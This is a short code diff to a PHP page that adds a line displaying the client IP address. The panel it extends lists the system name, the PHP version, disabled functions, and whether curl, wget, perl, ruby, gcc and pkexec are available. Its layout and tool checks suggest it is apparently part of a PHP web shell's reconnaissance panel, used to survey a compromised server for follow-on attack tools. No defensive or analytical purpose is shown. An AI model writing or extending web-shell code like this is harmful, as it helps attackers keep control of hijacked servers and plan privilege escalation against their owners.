@@ -37,6 +37,7 @@
         $showdisbfuncs = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<font color='lime'>NONE</font>";
         ?>
         <span>System Info: <?= php_uname(); ?></span>
+        <span>IP: <?= $_SERVER["REMOTE_ADDR"]; ?></span>
         <span>PHP Version: <?= phpversion(); ?></span>
         <span style="width: 100%; max-width: 350px;">CURL: <?= $curl; ?>, WGET: <?= $wget; ?>, PERL: <?= $perl; ?>, RUBY: <?= $ruby; ?>, GCC: <?= $gcc; ?>, PKEXEC: <?= $pkexec; ?></span>
         <span>Disabled Functions: <?= $showdisbfuncs; ?></span>
